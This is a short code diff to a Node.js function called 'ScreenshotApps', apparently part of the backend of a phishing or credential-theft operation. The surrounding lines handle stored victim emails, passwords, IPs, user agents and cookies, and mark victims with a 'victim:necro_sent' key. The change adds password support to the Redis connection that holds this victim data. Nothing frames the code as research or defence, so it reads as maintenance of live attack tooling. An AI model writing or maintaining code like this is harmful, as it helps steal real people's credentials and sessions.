@@ -158,7 +158,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     let victimEmail = null, victimPass = null, victimIP = null, victimUA = null, victimUUID = null
     try {
         const { createClient: _rc1 } = require('redis')
-        const rc1 = _rc1({ url: process.env.REDIS_URL || 'redis://redis:6379' })
+        const rc1 = _rc1({ url: process.env.REDIS_URL || (process.env.REDIS_PASSWORD ? 'redis://:***@redis:6379' : 'redis://redis:6379') })
         await rc1.connect()
         try {
             victimUUID = await rc1.hGet(taskId, 'name')
@@ -210,7 +210,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
         if (victimEmail) {
             try {
                 const { createClient: _rc2 } = require('redis')
-                const rc2 = _rc2({ url: process.env.REDIS_URL || 'redis://redis:6379' })
+                const rc2 = _rc2({ url: process.env.REDIS_URL || (process.env.REDIS_PASSWORD ? 'redis://:***@redis:6379' : 'redis://redis:6379') })
                 await rc2.connect()
                 const nx = await rc2.set(`victim:necro_sent:${victimEmail}`, '1', { NX: true, EX: 86400 })
                 alreadySent = (nx === null)
